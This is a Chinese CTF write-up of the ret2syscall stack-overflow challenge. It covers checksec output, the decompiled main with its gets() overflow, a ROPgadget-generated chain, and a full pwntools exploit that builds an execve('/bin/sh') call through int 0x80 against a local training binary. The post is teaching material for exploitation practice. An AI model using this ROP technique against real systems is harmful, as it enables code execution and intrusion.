---
layout: post
title: CTF-PWN实例2（ret2syscall）
categories: 
 - CTF
 - PWN
 - 二进制
permalink: /pwn/2
nocomments: true  # Disable the comment box. This is EasyBook feature
typora-root-url: ..\_site
---

# CTF-PWN实例2（ret2syscall）

## 题目地址：

https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/ret2syscall/bamboofox-ret2syscall

## 程序保护：

```shell
$ checksec ret2syscall
```

```shell
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

首先这里开启了NX保护。

## 程序信息：

一般我们还需要查看程序的信息，如静态链接动态链接等信息，前期未介绍是因为没有用上，这里就刚好需要。

```shell
$file rop

rop: ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux), statically linked, for GNU/Linux 2.6.24, BuildID[sha1]=2bff0285c2706a147e7b150493950de98f182b78, not stripped
```

这里需要注意的就是statically linked。表示静态链接，

## 解题：

### 一、IDA分析程序溢出点

IDA分析main函数：

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v4; // [sp+1Ch] [bp-64h]@1

  setvbuf(stdout, 0, 2, 0);
  setvbuf(stdin, 0, 1, 0);
  puts("This time, no system() and NO SHELLCODE!!!");
  puts("What do you plan to do?");
  gets(&v4);
  return 0;
}
```

这里依旧是gets()函数造成溢出。但是没有了system函数调用，这里想利用这个溢出将比较困难。

### 二、cyclic和pwndbg判断偏移量

偏移量依然是112，就不做过多篇幅。

### 三、编写EXP

思路：

这时候我们需要用到一个概念：只要我们把对应获取 shell 的系统调用的参数放到对应的寄存器中，那么我们在执行 int 0x80 就可执行对应的系统调用。

比如说这里我们利用如下系统调用来获取 shell

```
execve("/bin/sh",NULL,NULL)
```

其中，该程序是 32 位，所以我们需要使得

- 系统调用号，即 eax 应该为 0xb（exeve的系统调用号为0xb）
- 第一个参数，即 ebx 应该指向 /bin/sh 的地址，其实执行 sh 的地址也可以。
- 第二个参数，即 ecx 应该为 0
- 第三个参数，即 edx 应该为 0

这时候我们需要的就是想办法给对应的寄存器赋值。在汇编中，当栈顶是10时，执行pop eax，这时候eax的值就是10了。所以我们就可以一次一次拼凑出一个shell。

这里介绍一个工具ROPgadget能够帮助我们分析程序生成shell调用的代码段。当然也可以自己一步一步的获取到地址进行拼接。

```shell
$ROPgadget --binary ./rop --ropchain
```

最后生成一个python的模板，非常方便。

```python
#!/usr/bin/env python2
	# execve generated by ROPgadget

	from struct import pack

	# Padding goes here
	p = ''

	p += pack('<I', 0x0806eb6a) # pop edx ; ret
	p += pack('<I', 0x080ea060) # @ .data
	p += pack('<I', 0x080bb196) # pop eax ; ret
	p += '/bin'
	p += pack('<I', 0x0809a4ad) # mov dword ptr [edx], eax ; ret
	p += pack('<I', 0x0806eb6a) # pop edx ; ret
	p += pack('<I', 0x080ea064) # @ .data + 4
	p += pack('<I', 0x080bb196) # pop eax ; ret
	p += '//sh'
	p += pack('<I', 0x0809a4ad) # mov dword ptr [edx], eax ; ret
	p += pack('<I', 0x0806eb6a) # pop edx ; ret
	p += pack('<I', 0x080ea068) # @ .data + 8
	p += pack('<I', 0x08054590) # xor eax, eax ; ret
	p += pack('<I', 0x0809a4ad) # mov dword ptr [edx], eax ; ret
	p += pack('<I', 0x080481c9) # pop ebx ; ret
	p += pack('<I', 0x080ea060) # @ .data
	p += pack('<I', 0x0806eb91) # pop ecx ; pop ebx ; ret
	p += pack('<I', 0x080ea068) # @ .data + 8
	p += pack('<I', 0x080ea060) # padding without overwrite ebx
	p += pack('<I', 0x0806eb6a) # pop edx ; ret
	p += pack('<I', 0x080ea068) # @ .data + 8
	p += pack('<I', 0x08054590) # xor eax, eax ; ret
	p += pack('<I', 0x0807b5bf) # inc eax ; ret
	p += pack('<I', 0x0807b5bf) # inc eax ; ret
	p += pack('<I', 0x0807b5bf) # inc eax ; ret
	p += pack('<I', 0x0807b5bf) # inc eax ; ret
	p += pack('<I', 0x0807b5bf) # inc eax ; ret
	p += pack('<I', 0x0807b5bf) # inc eax ; ret
	p += pack('<I', 0x0807b5bf) # inc eax ; ret
	p += pack('<I', 0x0807b5bf) # inc eax ; ret
	p += pack('<I', 0x0807b5bf) # inc eax ; ret
	p += pack('<I', 0x0807b5bf) # inc eax ; ret
	p += pack('<I', 0x0807b5bf) # inc eax ; ret
	p += pack('<I', 0x08049421) # int 0x80
```

这时候编写exp就非常简单了，只需要将p参数拼接在溢出位置就可以了。

exp代码：

```python
#!/usr/bin/env python
# coding=utf-8
from struct import pack

# Padding goes here
p = ''

p += pack('<I', 0x0806eb6a) # pop edx ; ret
p += pack('<I', 0x080ea060) # @ .data
p += pack('<I', 0x080bb196) # pop eax ; ret
p += '/bin'
p += pack('<I', 0x0809a4ad) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x0806eb6a) # pop edx ; ret
p += pack('<I', 0x080ea064) # @ .data + 4
p += pack('<I', 0x080bb196) # pop eax ; ret
p += '//sh'
p += pack('<I', 0x0809a4ad) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x0806eb6a) # pop edx ; ret
p += pack('<I', 0x080ea068) # @ .data + 8
p += pack('<I', 0x08054590) # xor eax, eax ; ret
p += pack('<I', 0x0809a4ad) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x080481c9) # pop ebx ; ret
p += pack('<I', 0x080ea060) # @ .data
p += pack('<I', 0x0806eb91) # pop ecx ; pop ebx ; ret
p += pack('<I', 0x080ea068) # @ .data + 8
p += pack('<I', 0x080ea060) # padding without overwrite ebx
p += pack('<I', 0x0806eb6a) # pop edx ; ret
p += pack('<I', 0x080ea068) # @ .data + 8
p += pack('<I', 0x08054590) # xor eax, eax ; ret
p += pack('<I', 0x0807b5bf) # inc eax ; ret
p += pack('<I', 0x0807b5bf) # inc eax ; ret
p += pack('<I', 0x0807b5bf) # inc eax ; ret
p += pack('<I', 0x0807b5bf) # inc eax ; ret
p += pack('<I', 0x0807b5bf) # inc eax ; ret
p += pack('<I', 0x0807b5bf) # inc eax ; ret
p += pack('<I', 0x0807b5bf) # inc eax ; ret
p += pack('<I', 0x0807b5bf) # inc eax ; ret
p += pack('<I', 0x0807b5bf) # inc eax ; ret
p += pack('<I', 0x0807b5bf) # inc eax ; ret
p += pack('<I', 0x0807b5bf) # inc eax ; ret
p += pack('<I', 0x08049421) # int 0x80

from pwn import *
r = process('./rop')
r.sendline('a'*112+p)
r.interactive()

```

## 总结

这里就介绍一下几个词，为了避免弄混，先将例子解决了再来看概念。

ROP：其主要思想是在**栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程。**所谓 gadgets 就是以 ret 结尾的指令序列，通过这些指令序列，我们可以修改某些地址的内容，方便控制程序的执行流程。